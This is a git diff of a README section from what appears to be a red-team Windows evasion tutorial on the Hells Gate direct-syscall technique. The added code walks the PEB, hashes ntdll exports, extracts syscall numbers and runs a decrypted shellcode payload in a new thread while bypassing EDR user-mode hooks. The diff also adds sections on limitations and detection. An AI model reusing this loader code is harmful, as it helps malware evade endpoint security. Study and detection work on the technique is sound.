@@ -703,13 +703,12 @@ The step-by-step execution with debugger verification ensures that the unhooking
 </details>
 
 
-
 <details>
 <summary>04 - Hooks vs Hells Gate</summary>
-  
+
 ## Overview
 
-HellsGate is an advanced technique that dynamically resolves system call numbers at runtime, eliminating the need for hardcoded values that change between Windows versions. This method bypasses API hooks by making direct system calls while maintaining compatibility across different Windows releases.
+Hells Gate is an advanced technique that dynamically resolves system call numbers at runtime, eliminating the need for hardcoded values that change between Windows versions. This method bypasses API hooks by making direct system calls while maintaining compatibility across different Windows releases.
 
 ## The Problem: Changing Syscall Numbers
 
@@ -728,7 +727,6 @@ One way to deal with this problem is to dynamically detect which version of wind
 <img width="404" height="286" alt="image" src="https://github.com/user-attachments/assets/b9ae0a8b-bc84-49bd-a837-9dd311f31540" />
 
 [HellsGate PDF Documentation](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/blob/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/03.HellsGate/hells-gate.pdf)
-
 
 ## Implementation Architecture
 
@@ -788,6 +786,43 @@ In this particular implementation, the `VX_TABLE` is populated with information 
 
 An important principle to note here is that the HellsGate technique is designed to use functions exclusively from `ntdll.dll`. It intentionally does not rely on any additional DLLs, such as `kernel32.dll` or `user32.dll`, utilizing only `ntdll` to perform its operations.
 
+## Detailed Technical Process
+
+### The Resolution Workflow
+
+The HellsGate technique follows a systematic approach to resolve and utilize system calls:
+
+1. **PEB Navigation**: Access the Process Environment Block to locate NTDLL
+2. **PE Parsing**: Extract the export directory from NTDLL's headers
+3. **Function Hashing**: Use DJB2 algorithm to identify target functions
+4. **Syscall Extraction**: Scan function prologues for syscall patterns
+5. **Table Population**: Store resolved addresses and numbers in VX_TABLE
+6. **Execution**: Use assembly gates to invoke syscalls directly
+
+### DJB2 Hash Algorithm
+
+The implementation uses the DJB2 hash function created by Daniel J. Bernstein:
+```c
+DWORD64 HashStringDjb2(const char* str) {
+    DWORD64 hash = 5381;
+    int c;
+    while (c = *str++) {
+        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
+    }
+    return hash;
+}
+```
+
+### Syscall Stub Pattern
+
+The characteristic syscall stub pattern that HellsGate searches for:
+```
+4C 8B D1          ; MOV R10, RCX    (Standard syscall convention)
+B8 ?? ?? 00 00    ; MOV EAX, syscall_number
+0F 05             ; SYSCALL
+```
+
+The two bytes after `B8` contain the system call number in little-endian format.
 
 ## Step-by-Step Implementation
 
@@ -802,6 +837,15 @@ To find a specific system call number, we must parse the `ntdll.dll` that is loa
 <img width="1601" height="401" alt="image" src="https://github.com/user-attachments/assets/98a4f860-e22f-4971-9788-d105a8e75784" />
 
 The PEB contains a pointer to a doubly linked list called the In-Memory Order Module List, which holds all modules loaded in the process. The first module in this list is the process image itself, and the second is always `ntdll.dll`. By reading from this list, we get the base address of `ntdll.dll` in our process.
+
+**Code Implementation:**
+```c
+PPEB pPeb = (PPEB)__readgsqword(0x60);
+PLIST_ENTRY pListEntry = pPeb->Ldr->InMemoryOrderModuleList.Flink;
+pListEntry = pListEntry->Flink;  // First is executable, second is NTDLL
+PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+PVOID pNtdllBase = pLdrEntry->DllBase;
+```
 
 ### Step 2: Parse PE Headers for Export Directory
 
@@ -829,6 +873,23 @@ We then call a function to locate this hash within the `ntdll.dll` export table.
 
 <img width="1606" height="711" alt="image" src="https://github.com/user-attachments/assets/55675f73-7980-43bb-be1c-53b6f0587c09" />
 
+**Export Table Enumeration:**
+```c
+PDWORD pAddressOfFunctions = (PDWORD)((PBYTE)pDllBase + pExportDir->AddressOfFunctions);
+PDWORD pAddressOfNames = (PDWORD)((PBYTE)pDllBase + pExportDir->AddressOfNames);
+PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)pDllBase + pExportDir->AddressOfNameOrdinals);
+
+for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+    const char* pFunctionName = (const char*)pDllBase + pAddressOfNames[i];
+    DWORD64 functionHash = HashStringDjb2(pFunctionName);
+    
+    if (functionHash == pVxEntry->dwHash) {
+        pVxEntry->pAddress = (PVOID)((PBYTE)pDllBase + 
+                                   pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+        break;
+    }
+}
+```
 
 ### Step 4: Extract Syscall Number from Function Stub
 
@@ -840,6 +901,22 @@ The critical bytes we look for are:
 *   `B8`, which is the `mov eax, ...` opcode. The next four bytes after `B8` contain the system call number.
     <img width="1612" height="807" alt="image" src="https://github.com/user-attachments/assets/a30d4015-2a22-42b8-85cc-e7b6685a9b8e" />
 
+**Syscall Extraction Code:**
+```c
+PBYTE pFunctionBytes = (PBYTE)pVxEntry->pAddress;
+for (WORD idx = 0; idx < 500; idx++) {
+    if (pFunctionBytes[idx] == 0x4C &&
+        pFunctionBytes[idx + 1] == 0x8B &&
+        pFunctionBytes[idx + 2] == 0xD1 &&
+        pFunctionBytes[idx + 3] == 0xB8 &&
+        pFunctionBytes[idx + 6] == 0x00 &&
+        pFunctionBytes[idx + 7] == 0x00) {
+        
+        pVxEntry->wSystemCall = *(PWORD)(pFunctionBytes + idx + 4);
+        break;
+    }
+}
+```
 
 When this specific byte signature is found, the two bytes representing the system call number are extracted and stored in the `wSystemCall` element of our structure.
 
@@ -861,6 +938,32 @@ This two-step combo is used for all subsequent operations:
 
 It's important to note that this example runs the shellcode within its own process, but the same technique can be used for injection into another process.
 
+## Complete Payload Execution Flow
+
+```c
+// Allocate memory for payload
+HellsGate(vxTable.NtAllocateVirtualMemory.wSystemCall);
+HellDescent(NtCurrentProcess(), &lpAddress, 0, &dwSize, 
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+// Copy decrypted payload
+memcpy(lpAddress, decryptedPayload, payloadSize);
+
+// Change memory protection to executable
+HellsGate(vxTable.NtProtectVirtualMemory.wSystemCall);
+HellDescent(NtCurrentProcess(), &lpAddress, &dwSize, 
+            PAGE_EXECUTE_READ, &dwOldProtect);
+
+// Execute payload in new thread
+HellsGate(vxTable.NtCreateThreadEx.wSystemCall);
+HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, 
+            NtCurrentProcess(), lpAddress, NULL, 0, 0, 0, 0, NULL);
+
+// Wait for thread completion
+HellsGate(vxTable.NtWaitForSingleObject.wSystemCall);
+HellDescent(hThread, FALSE, NULL);
+```
+
 ## Debugger Analysis
 
 ### Setting Up the Debug Environment
@@ -872,7 +975,6 @@ __debugbreak();
 ```
 
 <img width="1608" height="717" alt="image" src="https://github.com/user-attachments/assets/7d3caf64-ee65-4a27-8ac6-bcb28c435808" />
-
 
 ### Step-by-Step Debugging
 
@@ -890,7 +992,6 @@ msbuild HellsGate.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"
 <img width="1233" height="611" alt="image" src="https://github.com/user-attachments/assets/225c88aa-af11-45fb-b61c-3d45a220efa2" />
 
  <img width="375" height="231" alt="image" src="https://github.com/user-attachments/assets/5e4be979-261d-4583-8769-a4e9ee071f82" />
-
 
 #### 2. Debugger Analysis of Hash Resolution
 
@@ -984,7 +1085,6 @@ We can then inspect the final `VX_TABLE` at its memory address (`0xf99...`) to s
 <img width="1672" height="467" alt="image" src="https://github.com/user-attachments/assets/6e935185-14b2-4632-9fb7-8210bd79744b" />
 <img width="1678" height="731" alt="image" src="https://github.com/user-attachments/assets/a79e3e47-6616-4915-bfae-15ab2692e091" />
 
-
 ### Stepping Through the Payload Execution
 
 The execution now proceeds to the payload function. We set a breakpoint at its entry and step into it and hit enter on the cmd.
@@ -996,13 +1096,11 @@ The first operation is a `LoadLibrary` call, which is only necessary for our spe
 
 <img width="1609" height="810" alt="image" src="https://github.com/user-attachments/assets/df665e0b-8342-47a1-bfe5-232276801d92" />
 
-
 After some diagnostic `printf` calls, we reach the core of the technique. We see the two values that correspond to our `HellsGate` and `HellDescent` functions. Let's examine the first call to `NtAllocateVirtualMemory`.
 
 <img width="1609" height="818" alt="image" src="https://github.com/user-attachments/assets/0f2b6d0c-0601-4ae0-9eed-89ab52812161" />
 <img width="1605" height="803" alt="image" src="https://github.com/user-attachments/assets/561c854e-d916-4feb-9516-dd6209e89180" />
 <img width="1611" height="683" alt="image" src="https://github.com/user-attachments/assets/cd0f3b36-8296-4d90-b63e-5cca102f2735" />
-
 
 1.  **Calling `HellsGate`:** The `HellsGate` function is called with a single parameter. We see the value `0x18` (the system call number for `NtAllocateVirtualMemory`) moved into the `ECX` register. Stepping into `HellsGate` shows this value being copied into the global variable.
 
@@ -1011,7 +1109,6 @@ After some diagnostic `printf` calls, we reach the core of the technique. We see
 This is from this code `hellsgate.asm`:
 
 <img width="1611" height="800" alt="image" src="https://github.com/user-attachments/assets/6826fc96-b01f-4d44-8959-b566d794cd61" />
-
 
 3.  **Calling `HellDescent`:** Immediately after, `HellDescent` is called. It is passed the same parameters that the real `NtAllocateVirtualMemory` function expects. Note that the second parameter (`RDX`) is a pointer to a variable that will receive the address of the newly allocated memory.
 
@@ -1051,100 +1148,58 @@ If we hit `enter` our shellcode gets executed:
 
 <img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/8e6b9159-d480-4bbe-b815-2bfa530e266f" />
 
-## Practical Usage
+## Limitations and Detection Vectors
 
-### Making Direct Syscalls
+### The Hook Problem
 
-```cpp
-// Instead of calling VirtualAlloc, use:
-HellsGate(VxTable[0].wSystemCall);  // Set NtAllocateVirtualMemory syscall
-NTSTATUS status = HellDescent(
-    GetCurrentProcess(), 
-    &lpAddress, 
-    0, 
-    &dwSize, 
-    MEM_COMMIT | MEM_RESERVE, 
-    PAGE_READWRITE
-);
+Hells Gate works very well but has one significant limitation: it cannot resolve syscalls from hooked NTDLL functions. When AV/EDR solutions hook functions, they replace the beginning of the function with a jump to their detection code:
+
+```
+Original Syscall Stub:
+4C 8B D1          ; MOV R10, RCX
+B8 18 00 00 00    ; MOV EAX, 0x18
+0F 05             ; SYSCALL
+
+Hooked Function:
+E9 XX XX XX XX    ; JMP to AV detection code
+90 90 90 90 90    ; NOP padding
 ```
 
-### Complete Injection Flow
+When HellsGate tries to scan for the syscall stub pattern in a hooked function, it fails because the characteristic bytes (`4C 8B D1 B8`) are replaced by the detour jump. The resolution function will reach its maximum search distance and return false, causing the program to exit.
 
-```cpp
-// 1. Allocate memory
-HellsGate(VxTable[0].wSystemCall);
-HellDescent(GetCurrentProcess(), &lpAddress, 0, &dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+### Testing Against Hooked NTDLL
 
-// 2. Write payload
-memcpy(lpAddress, decryptedPayload, payloadSize);
+To demonstrate this limitation:
+1. Copy the compiled executable to a directory monitored by security software
+2. Remove the debug breakpoint and recompile
+3. Run the executable from the monitored location
+4. Observe that the program fails to execute
 
-// 3. Change memory protection  
-HellsGate(VxTable[1].wSystemCall);
-HellDescent(GetCurrentProcess(), &lpAddress, &dwSize, PAGE_EXECUTE_READ, &oldProtect);
+The HellsGate technique successfully resolves functions but fails when it encounters hooks because it cannot find the syscall stub pattern in the modified function prologues.
 
-// 4. Execute
-HellsGate(VxTable[2].wSystemCall);
-HellDescent(NULL, &hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), lpAddress, NULL, FALSE, 0, 0, 0, NULL);
-```
+## Advanced Detection Considerations
 
-## Advantages
-
-- **Version Independent**: No hardcoded syscall numbers
-- **Bypasses Hooks**: Uses direct syscalls instead of hooked APIs
-- **Stealthy**: No suspicious API calls to monitor
-- **Reliable**: Works across Windows versions without modification
-
-## Limitations
-
-- **Complexity**: Requires understanding of PE structure and assembly
-- **Detection**: Some EDRs may monitor direct syscall usage patterns
-- **Maintenance**: Hash collisions possible if Microsoft adds functions with same hash
-
-## Advanced Considerations
-
-### Hash Collision Prevention
-The DJB2 hash algorithm used has a low collision rate, but for critical operations, consider:
-- Using a different hash algorithm
-- Adding length checks
-- Implementing fallback verification
-
-### Anti-Analysis Techniques
-- Remove debug breakpoints in production
-- Obfuscate hash values
-- Implement runtime integrity checks
-- Use multiple resolution methods as fallback
-
-## Verification Methods
-
-### Manual Verification
-```cpp
-// Verify resolved syscall numbers match expectations
-printf("NtAllocateVirtualMemory: 0x%X\n", VxTable[0].wSystemCall);
-printf("NtCreateThreadEx: 0x%X\n", VxTable[2].wSystemCall);
-```
-
-### Runtime Validation
-```cpp
-// Ensure syscall numbers are within expected range
-if (VxTable[0].wSystemCall < 0x0001 || VxTable[0].wSystemCall > 0x0FFF) {
-    // Potential detection or corruption
-    return -1;
-}
-```
+Modern EDR solutions may detect HellsGate through:
+- **Behavioral analysis**: Unusual sequence of direct syscall usage
+- **Memory scanning**: Detection of the characteristic hash values or resolution patterns
+- **Timing analysis**: The resolution process involves significant parsing that could be timed
+- **Export table monitoring**: Suspicious access patterns to NTDLL's export directory
 
 ## Conclusion
 
-HellsGate provides a robust method for dynamic syscall resolution that effectively bypasses user-mode API hooks. By combining PE parsing, hash-based function resolution, and direct system calls, this technique offers a powerful evasion mechanism that works across Windows versions without hardcoded dependencies.
+Hells Gate demonstrates an effective technique for dynamic syscall resolution that:
+- Eliminates version dependency by resolving syscall numbers at runtime
+- Bypasses user-mode API hooks by making direct system calls
+- Uses minimal dependencies (only NTDLL)
+- Provides a clean interface for syscall invocation
 
-The technique demonstrates that while security products can hook API functions, they cannot prevent direct system call invocation when the syscall numbers are dynamically resolved at runtime.
+However, its limitation against hooked NTDLL functions led to the development of more advanced techniques like Halo's Gate, which can resolve syscalls even from hooked functions by examining alternative memory regions and using fallback strategies.
 
-## Next Steps
+The technique remains valuable for educational purposes and demonstrates important concepts in Windows internals, PE parsing, and direct system call implementation.
 
-After implementing HellsGate, consider:
-1. **HalosGate**: Enhanced version that handles syscall number randomization
-2. **TartarusGate**: Further improvements for advanced EDR evasion
-3. **Syscall Obfuscation**: Techniques to hide direct syscall usage
-4. **Integration**: Combining with other evasion methods for layered protection
+</details>
+
+</details>
 
 
 </details>
